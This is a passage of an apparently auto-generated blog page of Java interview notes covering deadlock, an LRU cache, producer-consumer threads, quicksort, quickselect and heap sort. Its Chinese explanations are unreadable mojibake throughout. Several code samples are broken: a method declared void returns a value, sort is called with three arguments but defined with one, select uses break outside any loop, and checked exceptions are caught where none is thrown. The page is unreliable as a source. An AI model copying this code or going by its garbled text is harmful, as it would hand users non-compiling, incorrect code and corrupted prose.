class="literal">true</span>)&#123;</span><br><span class="line">            <span class="keyword">synchronized</span>(DeadLock.lock1)&#123;</span><br><span class="line">                System.out.println(<span class="string">&quot;A get lock1&quot;</span>);</span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    Thread.sleep(<span class="number">100</span>);</span><br><span class="line">                &#125; <span class="keyword">catch</span> (InterruptedException e) &#123;</span><br><span class="line">                    e.printStackTrace();</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">synchronized</span> (DeadLock.lock2)&#123;</span><br><span class="line">                    System.out.println(<span class="string">&quot;A get lock2&quot;</span>);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">B</span> <span class="keyword">implements</span> <span class="title class_">Runnable</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">run</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">while</span>(<span class="literal">true</span>)&#123;</span><br><span class="line">            <span class="keyword">synchronized</span>(DeadLock.lock2)&#123;</span><br><span class="line">                System.out.println(<span class="string">&quot;B get lock2&quot;</span>);</span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    Thread.sleep(<span class="number">100</span>);</span><br><span class="line">                &#125; <span class="keyword">catch</span> (InterruptedException e) &#123;</span><br><span class="line">                    e.printStackTrace();</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">synchronized</span> (DeadLock.lock1)&#123;</span><br><span class="line">                    System.out.println(<span class="string">&quot;B get lock1&quot;</span>);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3><span id="ä¸€ä»€ä¹ˆæ˜¯æ­»é”">ä¸€.ä»€ä¹ˆæ˜¯æ­»é”ï¼Ÿ</span></h3><p>ã€€ã€€ã€€æ­»é”æ˜¯ç”±äºä¸¤ä¸ªæˆ–ä»¥ä¸Šçš„çº¿ç¨‹äº’ç›¸æŒæœ‰å¯¹æ–¹éœ€è¦çš„èµ„æºï¼Œå¯¼è‡´è¿™äº›çº¿ç¨‹å¤„äºç­‰å¾…çŠ¶æ€ï¼Œæ— æ³•æ‰§è¡Œã€‚</p><h3><span id="äºŒäº§ç”Ÿæ­»é”çš„å››ä¸ªå¿…è¦æ¡ä»¶">äºŒ.äº§ç”Ÿæ­»é”çš„å››ä¸ªå¿…è¦æ¡ä»¶</span></h3><p>ã€€ã€€ã€€1.äº’æ–¥æ€§ï¼šçº¿ç¨‹å¯¹èµ„æºçš„å æœ‰æ˜¯æ’ä»–æ€§çš„ï¼Œä¸€ä¸ªèµ„æºåªèƒ½è¢«ä¸€ä¸ªçº¿ç¨‹å æœ‰ï¼Œç›´åˆ°é‡Šæ”¾ã€‚</p><p>ã€€ã€€ã€€2.è¯·æ±‚å’Œä¿æŒæ¡ä»¶ï¼šä¸€ä¸ªçº¿ç¨‹å¯¹è¯·æ±‚è¢«å æœ‰èµ„æºå‘ç”Ÿé˜»å¡æ—¶ï¼Œå¯¹å·²ç»è·å¾—çš„èµ„æºä¸é‡Šæ”¾ã€‚</p><p>ã€€ã€€ã€€3.ä¸å‰¥å¤ºï¼šä¸€ä¸ªçº¿ç¨‹åœ¨é‡Šæ”¾èµ„æºä¹‹å‰ï¼Œå…¶ä»–çš„çº¿ç¨‹æ— æ³•å‰¥å¤ºå ç”¨ã€‚</p><p>ã€€ã€€ã€€4.å¾ªç¯ç­‰å¾…ï¼šå‘ç”Ÿæ­»é”æ—¶ï¼Œçº¿ç¨‹è¿›å…¥æ­»å¾ªç¯ï¼Œæ°¸ä¹…é˜»å¡ã€‚</p><h3><span id="ä¸‰é¿å…æ­»é”çš„æ–¹æ³•">ä¸‰.é¿å…æ­»é”çš„æ–¹æ³•</span></h3><h4><span id="1ç ´åè¯·æ±‚å’Œä¿æŒæ¡ä»¶">1.ç ´åâ€œè¯·æ±‚å’Œä¿æŒâ€æ¡ä»¶</span></h4><p>ã€€ã€€ã€€ã€€ä¸€æ¬¡æ€§ç”³è¯·æ‰€æœ‰éœ€è¦ç”¨åˆ°çš„èµ„æºï¼Œä¸è¦ä¸€æ¬¡ä¸€æ¬¡æ¥ç”³è¯·ï¼Œå½“ç”³è¯·çš„èµ„æºæœ‰ä¸€äº›æ²¡ç©ºï¼Œé‚£å°±è®©çº¿ç¨‹ç­‰å¾…ã€‚ä¸è¿‡è¿™ä¸ªæ–¹æ³•æ¯”è¾ƒæµªè´¹èµ„æºï¼Œè¿›ç¨‹å¯èƒ½ç»å¸¸å¤„äºé¥¥é¥¿çŠ¶æ€ã€‚è¿˜æœ‰ä¸€ç§æ–¹æ³•æ˜¯ï¼Œè¦æ±‚è¿›ç¨‹åœ¨ç”³è¯·èµ„æºå‰ï¼Œè¦é‡Šæ”¾è‡ªå·±æ‹¥æœ‰çš„èµ„æºã€‚</p><h4><span id="2ç ´åä¸å¯æŠ¢å æ¡ä»¶">2.ç ´åâ€œä¸å¯æŠ¢å â€æ¡ä»¶</span></h4><p>ã€€ã€€ã€€ã€€å…è®¸è¿›ç¨‹è¿›è¡ŒæŠ¢å ï¼Œæ–¹æ³•ä¸€ï¼šå¦‚æœå»æŠ¢èµ„æºï¼Œè¢«æ‹’ç»ï¼Œå°±é‡Šæ”¾è‡ªå·±çš„èµ„æºã€‚æ–¹æ³•äºŒï¼šæ“ä½œç³»ç»Ÿå…è®¸æŠ¢ï¼Œåªè¦ä½ ä¼˜å…ˆçº§å¤§ï¼Œå¯ä»¥æŠ¢åˆ°ã€‚</p><h4><span id="3ç ´åå¾ªç¯ç­‰å¾…æ¡ä»¶">3.ç ´åâ€œå¾ªç¯ç­‰å¾…â€æ¡ä»¶</span></h4><p>ã€€ã€€ã€€ã€€å°†ç³»ç»Ÿä¸­çš„æ‰€æœ‰èµ„æºç»Ÿä¸€ç¼–å·ï¼Œè¿›ç¨‹å¯åœ¨ä»»ä½•æ—¶åˆ»æå‡ºèµ„æºç”³è¯·ï¼Œä½†æ‰€æœ‰ç”³è¯·å¿…é¡»æŒ‰ç…§èµ„æºçš„ç¼–å·é¡ºåºï¼ˆå‡åºï¼‰æå‡º</p><h2><span id="lru">LRU</span></h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">LRUCache</span> &#123;</span><br><span class="line">    <span class="type">int</span> cap,count;</span><br><span class="line">    HashMap&lt;Integer,Node&gt; map=<span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">    Node head,tail;</span><br><span class="line">    <span class="keyword">class</span> <span class="title class_">Node</span>&#123;</span><br><span class="line">        Node pre,next;</span><br><span class="line">        <span class="type">int</span> val,key;</span><br><span class="line">        <span class="keyword">public</span> <span class="title function_">Node</span><span class="params">(<span class="type">int</span> key,<span class="type">int</span> value)</span>&#123;</span><br><span class="line">            <span class="built_in">this</span>.key=key;</span><br><span class="line">            <span class="built_in">this</span>.val=value;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">public</span> <span class="title function_">Node</span><span class="params">()</span>&#123;</span><br><span class="line">            <span class="built_in">this</span>(<span class="number">0</span>,<span class="number">0</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">LRUCache</span><span class="params">(<span class="type">int</span> capacity)</span> &#123;</span><br><span class="line">        cap=capacity;</span><br><span class="line">        count=<span class="number">0</span>;</span><br><span class="line">        head=<span class="keyword">new</span> <span class="title class_">Node</span>();</span><br><span class="line">        tail=<span class="keyword">new</span> <span class="title class_">Node</span>();</span><br><span class="line">        head.next=tail;</span><br><span class="line">        tail.pre=head;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">get</span><span class="params">(<span class="type">int</span> key)</span> &#123;</span><br><span class="line">        <span class="type">Node</span> <span class="variable">n</span> <span class="operator">=</span> map.get(key);</span><br><span class="line">        <span class="keyword">if</span>(n==<span class="literal">null</span>) <span class="keyword">return</span> -<span class="number">1</span>;</span><br><span class="line">        remove(n);</span><br><span class="line">        add(n);</span><br><span class="line">        <span class="keyword">return</span> n.val;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">put</span><span class="params">(<span class="type">int</span> key, <span class="type">int</span> value)</span> &#123;</span><br><span class="line">        <span class="type">Node</span> <span class="variable">n</span> <span class="operator">=</span> map.get(key);</span><br><span class="line">        <span class="keyword">if</span>(n==<span class="literal">null</span>)&#123;</span><br><span class="line">            n = <span class="keyword">new</span> <span class="title class_">Node</span>(key,value);</span><br><span class="line">            map.put(key,n);</span><br><span class="line">            add(n);</span><br><span class="line">            count++;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            n.val=value;</span><br><span class="line">            remove(n);</span><br><span class="line">            add(n);</span><br><span class="line">        &#125;<span class="keyword">if</span>(count&gt;cap)&#123;</span><br><span class="line">            Node del=tail.pre;</span><br><span class="line">            remove(del);</span><br><span class="line">            map.remove(del.key);</span><br><span class="line">            count--;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">add</span><span class="params">(Node n)</span>&#123;</span><br><span class="line">        Node after=head.next;</span><br><span class="line">        head.next=n;</span><br><span class="line">        n.pre=head;</span><br><span class="line">        n.next=after;</span><br><span class="line">        after.pre=n;</span><br><span class="line">    &#125;</span><br><span class="line">     <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">remove</span><span class="params">(Node n)</span>&#123;</span><br><span class="line">         Node before=n.pre,after=n.next;</span><br><span class="line">         before.next=after;</span><br><span class="line">         after.pre=before;</span><br><span class="line">     &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2><span id="ç”Ÿäº§è€…æ¶ˆè´¹è€…">ç”Ÿäº§è€…æ¶ˆè´¹è€…</span></h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ClothesFactory</span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> <span class="type">int</span> size=<span class="number">10</span>;</span><br><span class="line">    <span class="keyword">private</span> LinkedList&lt;Object&gt; list = <span class="keyword">new</span> <span class="title class_">LinkedList</span>();</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">produce</span><span class="params">()</span>&#123;</span><br><span class="line">        <span class="keyword">synchronized</span>(list)&#123;</span><br><span class="line">            <span class="keyword">while</span>(list.size()&gt;=size)&#123;</span><br><span class="line">                <span class="keyword">try</span>&#123;</span><br><span class="line">                    list.wait();</span><br><span class="line">                &#125;<span class="keyword">catch</span>(InterruptedException e)&#123;</span><br><span class="line">                    e.printStackTrace();</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            list.addFirst(<span class="keyword">new</span> <span class="title class_">Object</span>());</span><br><span class="line">            list.notifyAll();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">comsume</span><span class="params">()</span>&#123;</span><br><span class="line">        <span class="keyword">synchronized</span>(list)&#123;</span><br><span class="line">            <span class="keyword">while</span>(list.size()&lt;=<span class="number">0</span>)&#123;</span><br><span class="line">                <span class="keyword">try</span>&#123;</span><br><span class="line">                    list.wait();</span><br><span class="line">                &#125;<span class="keyword">catch</span>(InterruptedException e)&#123;</span><br><span class="line">                    e.printStackTrace();</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            list.removeLast();</span><br><span class="line">            list.notifyAll();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Producer</span> <span class="keyword">implements</span> <span class="title class_">Runnable</span>&#123;</span><br><span class="line"><span class="keyword">private</span> ClothesFactory clothesFactory;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Producer</span><span class="params">(ClothesFactory clothesFactory)</span>&#123;</span><br><span class="line">        <span class="built_in">this</span>.clothesFactory=clothesFactory;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">run</span><span class="params">()</span>&#123;</span><br><span class="line">        <span class="keyword">while</span>(<span class="literal">true</span>)&#123;</span><br><span class="line">            <span class="keyword">try</span>&#123;</span><br><span class="line">                clothesFactory.produce();</span><br><span class="line">            &#125;<span class="keyword">catch</span>(InterruptedException e)&#123;</span><br><span class="line">                e.printStackTrace();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Comsumer</span> <span class="keyword">implements</span> <span class="title class_">Runnable</span>&#123;</span><br><span class="line"><span class="keyword">private</span> ClothesFactory clothesFactory;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Comsumer</span><span class="params">(ClothesFactory clothesFactory)</span>&#123;</span><br><span class="line">        <span class="built_in">this</span>.clothesFactory=clothesFactory;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">run</span><span class="params">()</span>&#123;</span><br><span class="line">        <span class="keyword">while</span>(<span class="literal">true</span>)&#123;</span><br><span class="line">            <span class="keyword">try</span>&#123;</span><br><span class="line">                clothesFactory.comsume();</span><br><span class="line">            &#125;<span class="keyword">catch</span>(InterruptedException e)&#123;</span><br><span class="line">                e.printStackTrace();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1><span id="æ’åº">æ’åº</span></h1><p>åˆ†ææ—¶é—´å¤æ‚åº¦</p><h2><span id="å¿«æ’">å¿«æ’ âˆš</span></h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">sort</span><span class="params">(<span class="type">int</span> a[])</span>&#123;</span><br><span class="line">    <span class="type">int</span> lo=<span class="number">0</span>,hi=a.length-<span class="number">1</span>;</span><br><span class="line">    <span class="keyword">if</span>(lo&lt;hi)&#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">mid</span> <span class="operator">=</span> qs(a,lo,hi);</span><br><span class="line">        sort(a,lo,mid-<span class="number">1</span>);</span><br><span class="line">        sort(a,mid+<span class="number">1</span>,hi);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">qs</span><span class="params">(<span class="type">int</span>[] a,<span class="type">int</span> lo,<span class="type">int</span> hi)</span>&#123;</span><br><span class="line">    <span class="type">int</span> i=lo,j=hi,x=a[lo];</span><br><span class="line">    <span class="keyword">if</span>(i&lt;j)&#123;</span><br><span class="line">      <span class="keyword">while</span>(i&lt;j&amp;&amp;a[j]&gt;=x)j--;</span><br><span class="line">      <span class="keyword">if</span>(i&lt;j) a[i]=a[j];</span><br><span class="line">      <span class="keyword">while</span>(i&lt;j&amp;&amp;a[i]&lt;x)i++;</span><br><span class="line">      <span class="keyword">if</span>(i&lt;j) a[j]=a[i];        </span><br><span class="line">    &#125;</span><br><span class="line">    a[i]=x;</span><br><span class="line">    <span class="keyword">return</span> i;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3><span id="1-æœ€ä¼˜æƒ…å†µ">1ã€æœ€ä¼˜æƒ…å†µ</span></h3><p>åœ¨æœ€ä¼˜æƒ…å†µä¸‹ï¼ŒPartitionæ¯æ¬¡éƒ½åˆ’åˆ†å¾—å¾ˆå‡åŒ€ï¼Œå¦‚æœæ’åºnä¸ªå…³é”®å­—ï¼Œå…¶é€’å½’æ ‘çš„æ·±åº¦å°±ä¸º [log2n]+1ï¼ˆ [x] è¡¨ç¤ºä¸å¤§äº x çš„æœ€å¤§æ•´æ•°ï¼‰ï¼Œå³ä»…éœ€é€’å½’ log2n æ¬¡ï¼Œéœ€è¦æ—¶é—´ä¸ºTï¼ˆnï¼‰çš„è¯ï¼Œç¬¬ä¸€æ¬¡Partiationåº”è¯¥æ˜¯éœ€è¦å¯¹æ•´ä¸ªæ•°ç»„æ‰«æä¸€éï¼Œåšnæ¬¡æ¯”è¾ƒã€‚ç„¶åï¼Œè·å¾—çš„æ¢è½´å°†æ•°ç»„ä¸€åˆ†ä¸ºäºŒï¼Œé‚£ä¹ˆå„è‡ªè¿˜éœ€è¦Tï¼ˆn&#x2F;2ï¼‰çš„æ—¶é—´ï¼ˆæ³¨æ„æ˜¯æœ€å¥½æƒ…å†µï¼Œæ‰€ä»¥å¹³åˆ†ä¸¤åŠï¼‰ã€‚äºæ˜¯ä¸æ–­åœ°åˆ’åˆ†ä¸‹å»ï¼Œå°±æœ‰äº†ä¸‹é¢çš„ä¸ç­‰å¼æ¨æ–­ï¼š</p><p><img src="http://img.blog.csdn.net/20140522095848359?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvb29oYWhhXzEyMw==/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/Center" alt="img"></p><h3><span id="2-æœ€ç³Ÿç³•æƒ…å†µ">2ã€æœ€ç³Ÿç³•æƒ…å†µ</span></h3><p>ç„¶åå†æ¥çœ‹æœ€ç³Ÿç³•æƒ…å†µä¸‹çš„å¿«æ’ï¼Œå½“å¾…æ’åºçš„åºåˆ—ä¸ºæ­£åºæˆ–é€†åºæ’åˆ—æ—¶ï¼Œä¸”æ¯æ¬¡åˆ’åˆ†åªå¾—åˆ°ä¸€ä¸ªæ¯”ä¸Šä¸€æ¬¡åˆ’åˆ†å°‘ä¸€ä¸ªè®°å½•çš„å­åºåˆ—ï¼Œæ³¨æ„å¦ä¸€ä¸ªä¸ºç©ºã€‚å¦‚æœé€’å½’æ ‘ç”»å‡ºæ¥ï¼Œå®ƒå°±æ˜¯ä¸€æ£µæ–œæ ‘ã€‚æ­¤æ—¶éœ€è¦æ‰§è¡Œnâ€1æ¬¡é€’å½’è°ƒç”¨ï¼Œä¸”ç¬¬iæ¬¡åˆ’åˆ†éœ€è¦ç»è¿‡nâ€iæ¬¡å…³é”®å­—çš„æ¯”è¾ƒæ‰èƒ½æ‰¾åˆ°ç¬¬iä¸ªè®°å½•ï¼Œä¹Ÿå°±æ˜¯æ¢è½´çš„ä½ç½®ï¼Œå› æ­¤æ¯”è¾ƒæ¬¡æ•°ä¸º</p><p><img src="/2020/04/14/Exam/image-20200414160932308.png"></p><h2><span id="å¿«é€Ÿé€‰æ‹©">å¿«é€Ÿé€‰æ‹© âˆš</span></h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">select</span><span class="params">(<span class="type">int</span> a[],<span class="type">int</span> k)</span>&#123;</span><br><span class="line">    <span class="type">int</span> lo=<span class="number">0</span>,hi=a.length-<span class="number">1</span>;</span><br><span class="line">    k--;</span><br><span class="line">    <span class="keyword">if</span>(lo&lt;hi)&#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">mid</span> <span class="operator">=</span> qs(a,lo,hi);</span><br><span class="line">       <span class="keyword">if</span>(mid&gt;k)&#123;</span><br><span class="line">           hi=mid-<span class="number">1</span>;</span><br><span class="line">       &#125;<span class="keyword">else</span> <span class="keyword">if</span>(mid==k)&#123;</span><br><span class="line">           <span class="keyword">break</span>;</span><br><span class="line">       &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">           lo=mid+<span class="number">1</span>;</span><br><span class="line">       &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">qs</span><span class="params">(<span class="type">int</span>[] a,<span class="type">int</span> lo,<span class="type">int</span> hi)</span>&#123;</span><br><span class="line">    <span class="type">int</span> i=lo,j=hi,x=a[lo];</span><br><span class="line">    <span class="keyword">if</span>(i&lt;j)&#123;</span><br><span class="line">      <span class="keyword">while</span>(i&lt;j&amp;&amp;a[j]&gt;=x)j--;</span><br><span class="line">      <span class="keyword">if</span>(i&lt;j) a[i]=a[j];</span><br><span class="line">      <span class="keyword">while</span>(i&lt;j&amp;&amp;a[i]&lt;x)i++;</span><br><span class="line">      <span class="keyword">if</span>(i&lt;j) a[j]=a[i];        </span><br><span class="line">    &#125;</span><br><span class="line">    a[i]=x;</span><br><span class="line">    <span class="keyword">return</span> i;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2><span id="å †æ’">å †æ’</span></h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">heap</span><span class="params">(<span class="type">int</span>[] a)</span>&#123;</span><br><span class="line">    <span class="type">int</span> <span class="variable">len</span> <span class="operator">=</span> a.length;</span><br><span class="line">    build(a,len);</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=len-<span class="number">1</span>;i&gt;<span class="number">0</span>;i--)&#123;</span><br><span class="line">        <span class="type">int</span> tmp=a[<span class="number">0</span>];</span><br><span class="line">        a[<span class="number">0</span>]=a[i];</span><br><span class="line">        a[i]=tmp;</span><br><span class="line">        len--;</span><br><span class="line">        sink(a,<span class="number">0</span>,len);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">build</span><span class="params">(<span class="type">int</span>[] a,<span class="type">int</span> len)</span>&#123;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=len/<span class="number">2</span>;i&gt;=<span class="number">0</span>;i--)&#123;</span><br><span class="line">        sink(a,i,len);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">sink</span><span class="params">(<span class="type">int</span>[] a,<span class="type">int</span> i,<span class="type">int</span> len)</span>&#123;</span><br><span class="line">    <span class="type">int</span> left=i*<span class="number">2</span>+<span class="number">1</span>;</span><br><span class="line">    <span class="type">int</span> right=<span class="number">2</span>*i+<span class="number">2</span>;</span><br><span class="line">    <span class="type">int</span> present=i;</span><br><span class="line">    <span class="keyword">if</span>(left&lt;len&amp;&amp;a[left]&gt;a[present]) present=left;</span><br><span class="line">    <span class="keyword">if</span>(right&lt;len&amp;&amp;a[right]&gt;a[present]) present=right;</span><br><span class="line">    <span class="keyword">if</span>(present!=i)&#123;</span><br><span class="line">        <span class="type">int</span> tmp=a[i];</span><br><span class="line">        a[i]=a[present];</span><br><span class="line">        a[present]=tmp;</span><br><span class="line">        sink(a,present,len);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>åœ¨æ„å»ºå †çš„è¿‡ç¨‹ä¸­ï¼Œå› ä¸ºæˆ‘ä»¬æ˜¯å®Œå…¨äºŒå‰æ ‘ä»æœ€ä¸‹å±‚æœ€å³è¾¹çš„éç»ˆç«¯ç»“ç‚¹å¼€å§‹æ„å»ºï¼Œå°†å®ƒä¸å…¶å­©å­è¿›è¡Œæ¯”è¾ƒå’Œè‹¥æœ‰å¿…è¦çš„äº’æ¢ï¼Œå¯¹äºæ¯ä¸ªéç»ˆç«¯ç»“ç‚¹æ¥è¯´ï¼Œå…¶å®æœ€å¤šè¿›è¡Œä¸¤æ¬¡æ¯”è¾ƒå’Œäº’æ¢æ“ä½œï¼Œå› æ­¤æ•´ä¸ªæ„å»ºå †çš„æ—¶é—´å¤æ‚åº¦ä¸ºO(n)ã€‚</p><p>åœ¨æ­£å¼æ’åºæ—¶ï¼Œç¬¬iæ¬¡å–å †é¡¶è®°å½•é‡å»ºå †éœ€è¦ç”¨O(logi)çš„æ—¶é—´ï¼ˆå®Œå…¨äºŒå‰æ ‘çš„æŸä¸ªç»“ç‚¹åˆ°æ ¹ç»“ç‚¹çš„è·ç¦»ä¸º.log2i.ï¼‹1ï¼‰ï¼Œå¹¶ä¸”éœ€è¦å–nï¼1æ¬¡å †é¡¶è®°å½•ï¼Œå› æ­¤ï¼Œé‡å»ºå 